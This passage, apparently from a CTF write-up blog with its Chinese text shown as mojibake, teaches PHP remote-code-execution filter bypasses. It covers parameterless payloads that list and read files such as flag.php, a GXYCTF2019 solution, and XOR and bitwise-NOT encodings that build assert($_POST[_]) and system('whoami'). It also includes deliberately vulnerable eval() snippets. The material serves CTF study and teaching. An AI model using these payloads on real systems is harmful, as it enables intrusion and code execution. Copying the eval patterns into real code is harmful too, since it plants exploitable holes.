class="comment">//output:&#x27;.&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(scandir(.));</span><br></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶(è¿‡æ»¤<code>.</code>)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure><p><strong>å–å½“å‰ç›®å½•ä¸‹æŒ‡å®šæ–‡ä»¶(éœ€çˆ†ç ´)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure><p><strong>è¯»æŒ‡å®šæ–‡ä»¶(éœ€çˆ†ç ´)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=show_source(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªå°ä¾‹é¢˜</p><h2 id="GXYCTF2019-ç¦æ­¢å¥—å¨ƒ"><a href="#GXYCTF2019-ç¦æ­¢å¥—å¨ƒ" class="headerlink" title="[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ"></a>[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</h2><p><strong>.git</strong>æ³„éœ²ï¼Œ<strong>Githack</strong>æ¢å¤ï¼Œå¾—åˆ°<strong>index.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;è¿˜å·®ä¸€ç‚¹å“¦ï¼&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;å†å¥½å¥½æƒ³æƒ³ï¼&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†ä¼ªåè®®çš„æ— å‚æ•°rce</p><h3 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h3><p><strong>session_id()</strong></p><p>å› ä¸ºè¿‡æ»¤äº†<strong>hex</strong>å’Œ<strong>bin</strong>ï¼Œæ‰€ä»¥å°±æ²¡åŠæ³•ä½¿ç”¨<strong>hex2bin</strong>è¿›è¡Œåå…­è¿›åˆ¶è§£ç ï¼Œä¸èƒ½ç›´æ¥æ‰§è¡Œå‘½ä»¤ï¼Œä½†å‘Šè¯‰äº†flagåœ¨flag.phpé‡Œé¢ï¼Œæ‰€ä»¥å¯ç›´æ¥è¯»å–flag.php</p><p>å¯åˆ©ç”¨çš„å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>()</span><br><span class="line"><span class="title function_ invoke__">show_source</span>()</span><br><span class="line"><span class="title function_ invoke__">file</span>()</span><br><span class="line"><span class="title function_ invoke__">readfile</span>()</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=<span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">session_id</span>(<span class="title function_ invoke__">session_start</span>()));</span><br></pre></td></tr></table></figure><p>ç”¨burpæˆªåŒ…å°†sessionæ”¹æˆå¦‚ä¸‹ï¼š<code>PHPSESSID:payload</code></p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081205728.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h3><p><strong>getcwd()<strong>å‡½æ•°è¢«è¿‡æ»¤äº†ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨</strong>localeconv()</strong> å‡½æ•°å’Œ**current()**å‡½æ•°æ¥ä»£æ›¿</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>());</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//è¿”å›&#x27;.&#x27;</span></span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±å¯ä»¥ç»§ç»­ä½¿ç”¨**scandir()**äº†</p><p>æŸ¥çœ‹å½“å‰ç›®å½•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())));</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081205676.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å‘ç°flag.phpç´¢å¼•ä¸º3</p><h4 id="tips1"><a href="#tips1" class="headerlink" title="tips1"></a>tips1</h4><p>ä½¿ç”¨**array_rand()**å‡½æ•°</p><p>ä½†æ˜¯å®ƒå–å‡ºçš„æ˜¯æ•°ç»„çš„é”®ï¼Œå¯ä½¿ç”¨<strong>array_flip()å‡½æ•°</strong>ï¼ŒæŠŠé”®ä¸å€¼äº¤æ¢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Copy?exp=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081208098.png" alt="image-20221008120850059"></p><p>è¯»å–flagæ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082244287.png" alt="image-20221008224433228"></p><h4 id="tips2"><a href="#tips2" class="headerlink" title="tips2"></a>tips2</h4><p>ä½¿ç”¨<code>array_reverse()</code>å‡½æ•°å’Œ<code>next()</code>å‡½æ•°ï¼Œç”¨<code>array_reverse()</code>å‡½æ•°å°†æ•°ç»„è¿›è¡Œ<strong>å€’åº</strong>ï¼Œç„¶åç”¨<code>next()</code>å‡½æ•°æŒ‡å‘ç´¢å¼•<code>1</code>å³<code>flag.php</code></p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=<span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081205725.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h1 id="æ— å­—æ¯æ•°å­—rce"><a href="#æ— å­—æ¯æ•°å­—rce" class="headerlink" title="æ— å­—æ¯æ•°å­—rce"></a>æ— å­—æ¯æ•°å­—rce</h1><p>åŸºæœ¬ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="php5å’Œphp7ä¸­çš„assert-å‡½æ•°"><a href="#php5å’Œphp7ä¸­çš„assert-å‡½æ•°" class="headerlink" title="php5å’Œphp7ä¸­çš„assert()å‡½æ•°"></a>php5å’Œphp7ä¸­çš„assert()å‡½æ•°</h2><p><strong>è¯·æ³¨æ„</strong>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.åœ¨PHP5ä¸­,assert()æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œå¯ä»¥ç”¨å½¢å¦‚`$a=assert;$a()`è¿™æ ·çš„å½¢å¼æ¥æ‰§è¡Œä»£ç ã€‚ä½†åœ¨PHP7ä¸­,å®˜æ–¹å¯¹assert()å‡½æ•°è¿›è¡Œäº†æ›´æ”¹,è®©å…¶å˜æˆäº†å’Œeval()ä¸€æ ·çš„è¯­è¨€ç»“æ„,ä¸å†æ”¯æŒä¸Šé¢é‚£ç§è°ƒç”¨æ–¹æ³•ã€‚</span><br><span class="line"></span><br><span class="line">2.PHP5ä¸æ”¯æŒ($a)()è¿™ç§è°ƒç”¨æ–¹å¼,å½¢å¦‚&#x27;phpinfo&#x27;();ä½†PHP7æ”¯æŒã€‚</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081716713.png" alt="image-20221008171657662"></p><h2 id="å¼‚æˆ–"><a href="#å¼‚æˆ–" class="headerlink" title="å¼‚æˆ–"></a>å¼‚æˆ–</h2><p>PHPä¸­ï¼Œä¸¤ä¸ªå˜é‡çš„å€¼è¿›è¡Œå¼‚æˆ–æ—¶ï¼Œä¼šå…ˆå°†ä¸¤ä¸ªå˜é‡çš„å€¼è½¬æ¢ä¸ºASCIIï¼Œå†å°†ASCIIè½¬æ¢ä¸ºäºŒè¿›åˆ¶æ•°æ®ï¼Œå¯¹ä¸¤å¯¹äºŒè¿›åˆ¶æ•°æ®è¿›è¡Œå¼‚æˆ–ï¼Œå¼‚æˆ–å®Œï¼Œå†å°†ç»“æœè½¬ä¸ºASCIIï¼Œæœ€åå°†ASCIIè½¬ä¸ºå­—ç¬¦ä¸²ï¼Œå³ä¸ºæœ€ç»ˆç»“æœã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> (<span class="string">&#x27;1&#x27;</span>^<span class="string">&#x27;b&#x27;</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">output: S</span></span><br><span class="line"><span class="comment">(1)</span></span><br><span class="line"><span class="comment">1çš„ASCIIå€¼ï¼š49</span></span><br><span class="line"><span class="comment">bçš„ASCIIå€¼ï¼š98</span></span><br><span class="line"><span class="comment">(2)</span></span><br><span class="line"><span class="comment">65è½¬ä¸ºäºŒè¿›åˆ¶ï¼š0110001</span></span><br><span class="line"><span class="comment">90è½¬ä¸ºäºŒè¿›åˆ¶ï¼š1100010</span></span><br><span class="line"><span class="comment">(3)</span></span><br><span class="line"><span class="comment">äºŒè¿›åˆ¶å¼‚æˆ–ç»“æœï¼š1010011</span></span><br><span class="line"><span class="comment">äºŒè¿›åˆ¶è½¬ä¸ºASCII: 83</span></span><br><span class="line"><span class="comment">ASCIIè½¬ä¸ºå­—ç¬¦ä¸²ï¼šS</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>phpå¼‚æˆ–è„šæœ¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&quot;assert&quot;</span>;</span><br><span class="line"><span class="variable">$result1</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$result2</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$num</span>=<span class="number">0</span>;<span class="variable">$num</span>&lt;=<span class="title function_ invoke__">strlen</span>(<span class="variable">$shell</span>);<span class="variable">$num</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$x</span>=<span class="number">33</span>;<span class="variable">$x</span>&lt;=<span class="number">126</span>;<span class="variable">$x</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">judge</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$x</span>)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="variable">$y</span>=<span class="number">33</span>;<span class="variable">$y</span>&lt;=<span class="number">126</span>;<span class="variable">$y</span>++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">judge</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$y</span>)))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="variable">$f</span> = <span class="title function_ invoke__">chr</span>(<span class="variable">$x</span>)^<span class="title function_ invoke__">chr</span>(<span class="variable">$y</span>);</span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable">$f</span> == <span class="variable">$shell</span>[<span class="variable">$num</span>])</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="variable">$result1</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$x</span>);</span><br><span class="line">                        <span class="variable">$result2</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$y</span>);</span><br><span class="line">                        <span class="keyword">break</span> <span class="number">2</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">judge</span>(<span class="params"><span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="variable">$c</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;å¼‚æˆ–&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result2</span>;</span><br></pre></td></tr></table></figure><p>pythonå¼‚æˆ–è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">command</span>):</span><br><span class="line">    code = <span class="string">&quot;~`!@#$%&amp;*()-=+_[]&#123;&#125;;:&lt;&gt;,.?/|&quot;</span></span><br><span class="line">    result_1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    result_2 = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> command:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> command.isalpha():</span><br><span class="line">            result_1 += x</span><br><span class="line">            result_2 += x</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> code:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">chr</span>(<span class="built_in">ord</span>(x) ^ <span class="built_in">ord</span>(y)) <span class="keyword">in</span> code:</span><br><span class="line">                result_1 += y</span><br><span class="line">                result_2 += <span class="built_in">chr</span>(<span class="built_in">ord</span>(x) ^ <span class="built_in">ord</span>(y))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&#x27;(&quot;<span class="subst">&#123;result_1&#125;</span>&quot; ^ &quot;<span class="subst">&#123;result_2&#125;</span>&quot;)&#x27;</span> </span><br><span class="line"></span><br><span class="line">a=encode(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><p><strong>æµ‹è¯•</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpinfo =&gt; &quot;+(+).&amp;/&quot;^&quot;[@[@@@@&quot;</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=$_=&quot;+(+).&amp;/&quot;^&quot;[@[@@@@&quot;;$_();</span><br></pre></td></tr></table></figure><p>å› ä¸º+ä¼šè¢«è½¬æˆç©ºæ ¼ï¼Œæ‰€ä»¥éœ€è¦urlç¼–ç ä¸€ä¸‹</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081704849.png" alt="image-20221008170400767"></p><h2 id="urlå–å"><a href="#urlå–å" class="headerlink" title="urlå–å"></a>urlå–å</h2><p>åŸç†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å­—ç¬¦ä¸² =&gt; ASCIIç  =&gt; äºŒè¿›åˆ¶æ•°æ® =&gt; å–å =&gt; ASCIIç  =&gt; å­—ç¬¦ä¸²</span><br></pre></td></tr></table></figure><p><strong>æµ‹è¯•</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;phpinfo&#x27;</span>);</span><br><span class="line"><span class="comment">//output: %8F%97%8F%96%91%99%90</span></span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=(~%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F%<span class="number">96</span>%<span class="number">91</span>%<span class="number">99</span>%<span class="number">90</span>)();</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081707338.png" alt="image-20221008170757263"></p><p><strong>ä¸€ä¸ªå°ä¾‹å­</strong></p><p>æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>å¼‚æˆ–</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=<span class="string">&quot;!((%)(&quot;</span>^<span class="string">&quot;@[[@[\\&quot;</span>; <span class="comment">//assert</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&quot;!+/((&quot;</span>^<span class="string">&quot;~&#123;`&#123;|&quot;</span>; <span class="comment">//_POST</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$$__</span>; </span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]); <span class="comment">//assert($_POST[_]);</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081719022.png" alt="image-20221008171907941"></p><p>åœ¨æœ‰system()ç­‰å‘½ä»¤æ‰§è¡Œå‡½æ•°çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥ç›´æ¥åˆ©ç”¨ï¼Œæ— éœ€è€ƒè™‘phpç‰ˆæœ¬å»æ„é€ assertï¼Œä¸ºè‡ªå·±æ‰¾éº»çƒ¦</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=<span class="string">&#x27;(&quot;((%-&#x27;</span>^<span class="string">&#x27;[[[\@@&#x27;</span>; <span class="comment">//system</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;((/!-)&#x27;</span>^<span class="string">&#x27;_@@@@@&#x27;</span>; <span class="comment">//whoami</span></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$__</span>); <span class="comment">//system(&#x27;whoami&#x27;)</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081730431.png" alt="image-20221008173013379"></p><p><strong>urlå–å</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=(~%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>)(~%<span class="number">88</span>%<span class="number">97</span>%<span class="number">90</span>%<span class="number">9</span>E%<span class="number">92</span>%<span class="number">96</span>);  <span class="comment">//system(&#x27;whoami&#x27;);</span></span><br></pre></td></tr></table></figure><p>æ³¨æ„æ­¤æ—¶phpç‰ˆæœ¬&gt;7</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081732606.png" alt="image-20221008173211563"></p><h2 id="æ±‰å­—å–å"><a href="#æ±‰å­—å–å" class="headerlink" title="æ±‰å­—å–å"></a>æ±‰å­—å–å</h2><p>æ€è·¯æ—¶åˆ©ç”¨UTF-8ç¼–ç çš„æŸä¸ªæ±‰å­—ï¼Œå¹¶å°†å…¶ä¸­æŸä¸ªå­—ç¬¦å–å‡ºæ¥ï¼Œè¿›è¡Œå–åæ“ä½œåè·å¾—ç›¸åº”å­—ç¬¦</p><p><strong>POC</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;æ˜¯å¤œé™æ‚„æ‚„ä¸‡ç‰©æ— å£°é£æ·¡æ·¡çš„å¹æ¥å¸¦ç€ä¸€ä¸çš„å‡‰æ„å¤çš„ç‚çƒ­åœ¨å¤œæ™šæ¶ˆå¤±æ— è¸ªä»°æœ›å¤©ç©ºå¤©è¾¹å‡ é¢—æ˜Ÿå­ç‚¹ç¼€ç€å¤œå¹•è„šä¸‹æ¯å¤©èµ°ç€çš„å°è·¯åœ¨ä»Šå¤©çŠ¹ç‹¬çš„å¯‚é™å¯‚é™å¾—ç¾ä¸½å–œæ¬¢è¿™æ ·çš„å¤œæ™šæœˆå…‰å¦‚æ°´èˆ¬çš„æµæ³»å½“å–§åš£éšå…¥é™å¯‚çµåŠ¨çš„æ¸…é£ç‰µå¼•å€¦æ€ 